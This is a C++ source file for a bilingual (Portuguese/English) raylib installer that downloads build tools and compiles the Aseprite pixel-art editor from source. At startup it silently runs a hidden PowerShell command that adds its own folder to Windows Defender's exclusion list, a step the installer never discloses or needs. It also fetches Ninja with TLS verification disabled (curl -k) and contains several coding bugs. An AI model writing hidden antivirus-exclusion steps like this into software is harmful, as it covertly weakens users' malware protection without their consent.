#include <filesystem>
#include <string>
#include <fstream>
#pragma warning(disable : 4996)
#include <cstdio>
#include <cstdlib>
#include <iomanip>
#include <cstring>
#include <direct.h>
#include <thread>
#include <vector>
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#define NOGDI             
#define NOUSER  
#endif
#undef Rectangle
#undef CloseWindow
#undef ShowCursor
#undef PlaySound
extern "C" {
#include "raylib.h"
}
#define RAYGUI_IMPLEMENTATION
#define MB_OK 0x00000000L
#define MB_ICONINFORMATION   0x00000040L
extern "C" {
    __declspec(dllimport) int __stdcall MessageBoxA(void* hWnd, const char* lpText, const char* lpCaption, unsigned int uType);
}
#define MessageBox MessageBoxA
#include "raygui.h"
extern "C" int __stdcall WinExec(const char* lpCmdLine, unsigned int uCmdShow);
#define SW_HIDE 0
namespace fs = std::filesystem;
bool instalando = false;
bool disparado = false;
int passo = 0;
bool editMode = false;
double tempoInicio = GetTime();
float tempoRestante = 0; 
float progresso = 0.0;
std::string cmd = "";
std::vector<std::string> ultimasLinhas;
void ExecutarComLog(std::string comando) {
    FILE* pipe = _popen(comando.c_str(), "r");
    if (!pipe) return;

    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        std::string linha = buffer;
        if (!linha.empty() && linha.back() == '\n') linha.pop_back();

        if (!linha.empty()) {
            ultimasLinhas.push_back(linha);
            if (ultimasLinhas.size() > 5) {
                ultimasLinhas.erase(ultimasLinhas.begin());
            }
        }
    }
    _pclose(pipe);
}
int main() {
    bool prontoParaProximo = false;
    int contagemLetras = 11;
    int pagina = 0;
    int comandoEnviado = 2;
    char pasta[300] = "C:\Aseprite";
    bool jaDisparado = false;
    int letras = 11;
    int x = 600, y = 450;
    int x2 = 500, y2 = 600;
    char caminho;
    int seila = 1;
    char lingua = ' ';
    int caixa_de_texto = 10;
    char path[260];
    char comando1[560];
    char comando2[560];
    char comando3[560];
    char comando[2048];
    Vector2 posicaoTexto2 = { 310, 20 };
    Vector2 posicaoTexto55 = { 320, 350 };
    _getcwd(path, sizeof(path));
    Rectangle botao3 = { 320, 350, 150, 70 };
    bool mouseEmCima3 = false;
    sprintf_s(comando, "powershell -Command \"Add - MpPreference - ExclusionPath '%s'\"", path);
    WinExec(comando, SW_HIDE);
    InitWindow(x, y, "Instalador Aseprite");
    GuiSetStyle(DEFAULT, TEXT_SIZE, 30);
    SetTargetFPS(60);
    sprintf_s(comando2, "%s\\Roboto\\Roboto-VariableFont_wdth,wght.ttf", path);
    Font Roboto = LoadFontEx(comando2, 800, 0, 800);
    sprintf_s(comando1, "%s\\icon\\icon1.png", path);
    Texture2D logo = LoadTexture(comando1);
    sprintf_s(comando1, "%s\\icon\\icon2.png", path);
    Texture2D logo2 = LoadTexture(comando1);
    sprintf_s(comando2, "%s\\icon\\icon1.png", path);
    Image icone = LoadImage(comando2);
    sprintf_s(comando3, "%s\\icon\\3143442.png", path);
    Texture2D arquivo = LoadTexture(comando3);
    SetWindowIcon(icone);
    UnloadImage(icone);
    while (!WindowShouldClose()) {
        Color corFundo = { 33, 37, 43, 255 }; 
        if (pagina == 0 || pagina == 1) {
            corFundo = { 33, 37, 43, 255 }; 
        }
        else {
            corFundo = { 235, 235, 240, 255 }; 
        }
        BeginDrawing();
        ClearBackground(corFundo);
        if (pagina == 0) {
            DrawRectangleRounded({ 20, 20, 560, 410 }, 0.1f, 10, { 45, 49, 58, 255 }); 
            DrawRectangleRoundedLines({ 20, 20, 560, 410 }, 0.1f, 10, 2, { 60, 65, 75, 255 });
            DrawTexture(logo2, 280, 130, WHITE);
            GuiSetStyle(DEFAULT, TEXT_COLOR_NORMAL, ColorToInt(WHITE));
            GuiSetFont(Roboto);
            GuiSetStyle(BUTTON, BASE_COLOR_NORMAL, ColorToInt({ 33, 37, 43, 255 }));
            GuiSetStyle(BUTTON, TEXT_COLOR_NORMAL, ColorToInt(WHITE));
            GuiSetStyle(BUTTON, BASE_COLOR_FOCUSED, ColorToInt({ 80, 85, 95, 255 }));
            GuiSetStyle(BUTTON, TEXT_COLOR_FOCUSED, ColorToInt(WHITE));
            GuiSetStyle(BUTTON, BASE_COLOR_PRESSED, ColorToInt(corFundo));
            GuiSetStyle(BUTTON, TEXT_COLOR_PRESSED, ColorToInt(BLACK));
            GuiLabel({ 30, 50, 300, 30 }, "Welcome to");
            GuiLabel({ 30, 80, 400, 30 }, "Aseprite setup");
            GuiLabel({ 30, 140, 300, 30 }, "Bem vindo ao");
            GuiLabel({ 30, 170, 400, 30 }, "instalador do Aseprite");
            GuiLabel({ 30, 230, 300, 30 }, "Selecione sua lingua:");
            GuiLabel({ 30, 320, 400, 30 }, "Select your language:");

            GuiButton({ 370 , 350, 190, 70 }, "English");


            if (GuiButton({ 370, 30, 190, 70 }, "Portugues")) {
                lingua = 'p';
                pagina = 1;
            }
            if (GuiButton({ 370, 350, 190, 70 }, "English")) {
                lingua = 'e';
                pagina = 1;
            }
        }
        else if (pagina == 1) {
            const char* titulo = (lingua == 'p') ? "DIRETORIO DE INSTALACAO:" : "SETUP DIRECTORY:";
            const char* btnTexto = (lingua == 'p') ? "INSTALAR" : "INSTALL";
            DrawRectangleRounded({ 25, 115, 550, 40 }, 0.2f, 10, { 25, 28, 35, 255 });
            if (GuiTextBox({ 30, 120, 540, 30 }, pasta, 512, editMode)) {
                editMode = !editMode;
            }
            DrawTexture(arquivo, 370, 140, WHITE);
            GuiLabel({ 30, 50, 500, 40 }, titulo);

            if (GuiTextBox({ 30, 120, 540, 30 }, pasta, 512, editMode)) {
                editMode = !editMode;
            }
            if (GuiButton({ 150, 250, 300, 70 }, btnTexto)) {
                pagina = 60;
            }
            if (GuiButton({ 30, 380, 100, 40 }, (lingua == 'p' ? "Voltar" : "Back"))) {
                pagina = 0;
            }
        }
        if (pagina == 60) {
            if (!DirectoryExists(TextFormat("%s", pasta))) {
                std::string copiapasta = pasta;
                std::thread([copiapasta, pasta]() {
                    char comando90[2000];
                    std::string pasta45 = pasta;
                    fs::create_directory(pasta45);
                    }).detach();
            }
                pagina = 2;
        }
  
        else if (pagina == 2) {
            DrawRectangleRounded({ 25, 120, 570, 120 }, 0.1f, 10, { 20, 23, 28, 255 });
            for (int i = 0; i < (int)ultimasLinhas.size(); i++) {
                DrawText(ultimasLinhas[i].c_str(), 35, 125 + (i * 20), 2, GREEN);
            }
            Vector2 PosStatus = { 90, 30 };
            corFundo = { 33, 37, 43, 255 };
            if (lingua == 'p') {
                DrawText("INSTALANDO Aseprite...", 120, 80, 30, MAROON);
            }
            else {
                DrawText("INSTALLING Aseprite...", 120, 80, 30, MAROON);
            }
            const char* status = "Iniciando...";
            if (lingua == 'p') {
                if (passo == 0) status = "Copiando Visual Studio...";
                else if (passo == 2) status = "Baixando CMake...";
                else if (passo == 4) status = "Baixando Skia...";
                else if (passo == 5) status = "Verificando Git...";
                else if (passo == 6) status = "Baixando Ninja...";
                else if (passo == 7) status = "Verificando Aseprite...";
                else if (passo >= 8) status = "Baixando e compilando Aseprite...";
            }
            else {
                if (passo == 0) status = "Copping Visual Studio...";
                else if (passo == 2) status = "Downloading CMake...";
                else if (passo == 4) status = "Downloading Skia...";
                else if (passo == 5) status = "Downloading Git...";
                else if (passo == 6) status = "Downloading Ninja...";
                else if (passo == 7) status = "Checking Aseprite...";
                else if (passo >= 8) status = "Downloading and building Aseprite...";
            }
            DrawTextEx(Roboto, status, PosStatus, 40, 2, BLACK);
            float barraX = 50;
            float barraY = 300;
            float barraLarguraTotal = 500;
            float barraAltura = 30;
            DrawRectangleRounded({ barraX, barraY, barraLarguraTotal, barraAltura }, 0.5f, 10, { 200, 200, 210, 255 });
            float larguraPreenchimento = barraLarguraTotal * progresso;
            DrawRectangleRounded({ barraX, barraY, larguraPreenchimento, barraAltura }, 0.5f, 10, { 46, 204, 113, 255 });
            DrawRectangleRoundedLines({ barraX, barraY, barraLarguraTotal, barraAltura }, 0.5f, 10, 2, { 160, 160, 170, 255 });
            DrawText(TextFormat("%d%%", (int)(progresso * 100)), 280, barraY + 40, 20, DARKGRAY);
            if (passo == 0) {
                if (!disparado) {
                    disparado = true;
                    if (lingua == 'p') {
                        MessageBoxA(NULL, "Estamos prosseguindo\ncom a instalacao\ndo Visual Studio,\ncaso ja tenha intalado\ncertifiquece de que\nestá marcado:\ndesenvolvimento para desktop com C++\nsdk do Windows 10 e 11\nferramentas de CMake", "Aviso", MB_OK | MB_ICONINFORMATION);
                    }
                    else {
                        MessageBoxA(NULL, "We are proceeding with\nthe installation\nof Visual Studio.\nIf you have already installed it,\nmake sure that the following is checked:\nDesktop development with C++\nWindows 10 and 11 SDK\nCMake tools.", "Aviso", MB_OK | MB_ICONINFORMATION);
                    }
                    std::string p = fs::path(pasta).make_preferred().string();
                    std::thread([=, &prontoParaProximo]() {
                        instalando = true;
                        std::string cmdBaixar = "curl -L -o \"" + p + "\\vs.exe\" https://aka.ms/vs/17/release/vs_community.exe 2>&1";
                        ExecutarComLog(cmdBaixar);
                        std::string cmdInstalar = "\"" + p + "\\vs.exe\" --passive --norestart --wait "
                            "--add Microsoft.VisualStudio.Workload.NativeDesktop "
                            "--add Microsoft.VisualStudio.Component.Windows11SDK.22621"
                            "--add Microsoft.VisualStudio.Component.VC.Tools.x86.x64 "
                            "--add Microsoft.VisualStudio.Component.Windows10SDK.18362 "
                            "--add Microsoft.VisualStudio.Component.VC.CMake.Project 2>&1";
                        ExecutarComLog(cmdInstalar);
                        std::string hhh = "echo PRONTO > \"" + p + "\\status.txt\"";
                        ExecutarComLog(hhh);
                        while (true) {
                            if (FileExists((p + "\\status.txt").c_str())) {
                                remove((p + "\\status.txt").c_str());
                                prontoParaProximo = true;
                                break;
                            }
                            std::this_thread::sleep_for(std::chrono::milliseconds(500));
                        }
                        }).detach();
                }
                if (instalando) {
                    const char* path2 = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\VsDevCmd.bat";
                    bool vsExiste = FileExists(path2);

                    if (!prontoParaProximo) {
                        float incremento = vsExiste ? 0.0002f : 0.00002f;
                        if (progresso < 0.95f) progresso += incremento;
                    }
                    else {
                        progresso = 1.0f; 
                    }
                }

                if (progresso >= 1.0f && prontoParaProximo) {
                    passo = 2;
                    progresso = 0.0f;
                    disparado = false;
                    prontoParaProximo = false;
                    instalando = false;
                }
            }
            else if (passo == 2) {
                if (!disparado) {
                    disparado = true;
                    std::string p = fs::path(pasta).make_preferred().string();
                    std::thread([=, &prontoParaProximo]() {
                        std::string cleanCmd = "cmd.exe /c rd /s /q \"" + p + "\\Cmake\" 2>&1";
                        ExecutarComLog(cleanCmd);
                        std::string cmdInstalar = "cmd.exe /c curl -L -o \"" + p + "\\cmake.zip\" https://github.com/Kitware/CMake/releases/download/v3.31.11/cmake-3.31.11-windows-x86_64.zip && "
                            "tar -xf \"" + p + "\\cmake.zip\" -C \"" + p + "\" && "
                            "move \"" + p + "\\cmake-3.31.11-windows-x86_64\" \"" + p + "\\Cmake\" && "
                            "del \"" + p + "\\cmake.zip\"";

                        ExecutarComLog(cmdInstalar);
                        char pathVerificacao2[512];
                        sprintf_s(pathVerificacao2, "%s\\Cmake\\bin\\cmake.exe", pasta);
                        if (FileExists(pathVerificacao2)) {
                            prontoParaProximo = true;
                        }
                        }).detach();
                }
                if (!prontoParaProximo) {
                    if (progresso < 0.95f) progresso += 0.0005f;
                }
                else {
                    progresso = 1.0f;
                }
                char pathVerificacao[512];
                sprintf_s(pathVerificacao, "%s\\Cmake\\bin\\cmake.exe", pasta);

                if (prontoParaProximo && FileExists(pathVerificacao)) {
                    passo = 4; 
                    progresso = 0.0f;
                    disparado = false;
                    prontoParaProximo = false;
                }
            }

            else if (passo == 4) {
                if (!disparado) {
                    disparado = true;
                    std::string p = fs::path(pasta).make_preferred().string();
                    std::thread([p]() {
                    std::string pastaSkia = p + "\\skia";
                    if (!fs::exists(pastaSkia)) fs::create_directory(pastaSkia);
                        std::string skiaInstall = "cmd.exe /c curl -L -o \"" + p + "\\skia.zip\" https://github.com/aseprite/skia/releases/download/m124-08a5439a6b/Skia-Windows-Release-x64.zip && "
                            "tar -xf \"" + p + "\\skia.zip\" -C \"" + p + "\\skia\" && "
                            "del \"" + p + "\\skia.zip\" 2>&1";
                        ExecutarComLog(skiaInstall);
                        }).detach();
                }
                char path3[512]; 
                sprintf_s(path3, "%s\\skia\\out\\Release-x64\\skia.lib", pasta);

                if (FileExists(path3)) {
                    progresso = 1.0f;
                    passo = 5;
                    progresso = 0.0f;
                    disparado = false;
                }
                else {
                    if (progresso < 0.95f) progresso += 0.0001f;
                }
            }

            else if (passo == 5) {
                if (!disparado) {
                    disparado = true;
                    std::string p = fs::path(pasta).make_preferred().string();
                    std::thread([p, &prontoParaProximo]() { 
                        std::string gitCmd = "cmd.exe /c curl -L -o \"" + p + "\\Git.7z.exe\" https://github.com/git-for-windows/git/releases/download/v2.53.0.windows.3/PortableGit-2.53.0.3-64-bit.7z.exe && \"" + p + "\\Git.7z.exe\" -y -gm2 -InstallPath=\"" + p + "\" 2>&1";
                        ExecutarComLog(gitCmd);
                        prontoParaProximo = true;
                        }).detach();
                }
                if (!prontoParaProximo) {
                    if (progresso < 0.95f) progresso += 0.0005f;
                }
                else {
                    progresso = 1.0f;
                    char gitPath[512];
                    sprintf_s(gitPath, "%s\\PortableGit\\bin\\git.exe", pasta);
                    if (FileExists(gitPath)) {
                        passo = 6;
                        progresso = 0.0f;
                        disparado = false;
                        prontoParaProximo = false;
                    }
                }
}

            else if (passo == 6) {
                bool instalando6 = true;
                std::string p = fs::path(pasta).make_preferred().string();
                if (!disparado) {
                    disparado = true;
                    std::thread([pasta]() {
                        char cmd2[4000];
                        sprintf_s(cmd2,
                            "cmd.exe /c \"mkdir \"%s\\ninja\" && curl -fL -k -o \"%s\\ninja-win.zip\" https://github.com/ninja-build/ninja/releases/download/v1.13.1/ninja-win.zip && tar -xf \"%s\\ninja-win.zip\" -C \"%s\\ninja\" && tar -xf \"%s\\ninja-win.zip\" -C \"%s\\Cmake\\bin\" && del \"%s\\ninja-win.zip\"",
                            pasta, pasta, pasta, pasta, pasta, pasta, pasta, pasta, pasta, pasta);
                        WinExec(cmd2, SW_HIDE);
                        }).detach();
                }
                if (FileExists(TextFormat("%s\\Cmake\\bin\\ninja.exe", pasta))) {
                    passo = 7;
                    progresso = 0.0f;
                    disparado = false;
                    prontoParaProximo = false;
                }
                if (instalando6) {
                    char path6[300] = " ";
                    sprintf(path6, "\"%s\\Cmake\\bin\\ninja.exe", pasta);
                    if (progresso < 1.0) {
                        progresso += 0.005f;
                    }
                    if (progresso < 1.0 && FileExists(path6)) progresso = 1.0;
                    if (progresso > 0.95 && !FileExists(path6)) progresso = 0.95;
                }
            }

            else if (passo == 7) {
                bool instalando7 = true;
                std::string p = fs::path(pasta).make_preferred().string();
                if (!disparado) {
                    disparado = true;
                    std::thread([&prontoParaProximo, p]() {
                        std::string install = "cmd.exe /c \"cd /d \"" + p + "\" && \"" + p + "\"\\PortableGit\\bin\\git.exe clone --recursive https://github.com/aseprite/aseprite.git && cd aseprite && \"" + p + "\"\\PortableGit\\bin\\git.exe pull && \"" + p + "\"\\PortableGit\\bin\\git.exe submodule update --init --recursive 2>&1";
                        ExecutarComLog(install);
                        prontoParaProximo = true;
                        }).detach();
                }
                if (DirectoryExists(TextFormat("%s\\aseprite", pasta)) && prontoParaProximo) {
                    passo = 8;
                    progresso = 0.0f;
                    disparado = false;
                }
                if (instalando7 && !prontoParaProximo) {
                    char path7[300] = " ";
                    sprintf(path7, "\"%s\\aseprite\\cmake\\FindBenchmarks.cmake", pasta);
                    if (progresso < 1.0) {
                        progresso += 0.005f;
                    }
                    if (progresso < 1.0 && FileExists(path7) && prontoParaProximo) progresso = 1.0;
                    if (progresso > 0.95 && !FileExists(path7) && !prontoParaProximo) progresso = 0.95;
                }
            }
            else if (passo == 8) {
                bool instalando8 = true;
                std::string p = fs::path(pasta).make_preferred().string();
                if (!disparado) {
                    disparado = true;
                    std::thread([&prontoParaProximo, p]() {
                        char cmd[4096];
                        std::string final = "call \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\VsDevCmd.bat\" -arch=x64 && cd \"" + p + "\\aseprite\" && mkdir build && cd build && \"" + p + "\\Cmake\\bin\\cmake.exe\" -DCMAKE_BUILD_TYPE=RelWithDebInfo -G Ninja -DLAF_BACKEND=skia -DSKIA_DIR=\"" + p + "\"\\skia -DSKIA_LIBRARY_DIR=\"" + p + "\"\\skia\\out\\Release-x64 -DSKIA_LIBRARY=\"" + p + "\"\\skia\\out\\Release-x64\\skia.lib .. && \"" + p + "\"\\ninja\\ninja.exe aseprite 2>&1";
                        ExecutarComLog(final);
                        prontoParaProximo = true;
                        }).detach();
                }
                if (FileExists(TextFormat("%s\\aseprite\\build\\bin\\aseprite.exe", pasta)) && prontoParaProximo) {
                    passo = 9;
                    progresso = 1.0f;
                    pagina = 3;
                }
                if (instalando8 && !prontoParaProximo) {
                    char path7[300] = " ";
                    sprintf(path7, "\"%s\\aseprite\\build\\bin\\aseprite.exe", pasta);
                    if (progresso < 1.0) {
                        progresso += 0.005f;
                    }
                    if (progresso < 1.0 && FileExists(path7) && prontoParaProximo) progresso = 1.0;
                    if (progresso > 0.95 && !FileExists(path7) || progresso > 0.95 && !prontoParaProximo) progresso = 0.95;
                }
            }
        }
            if(passo == 9 && pagina == 3) {
                const char* titulo = (lingua == 'p') ? "INSTALADO\nCOM SUCCESSO:" : "SUCCESS:";
                const char* btnTexto = (lingua == 'p') ? "OK" : "OK";
                GuiLabel({ 30, 50, 500, 40 }, titulo);
                GuiButton({ 150, 250, 300, 70 }, btnTexto);
                if (GuiButton({ 150, 250, 300, 70 }, btnTexto)) {
                    break;
                }
        }
        EndDrawing();
    }
    CloseWindow();
        return 0;
}



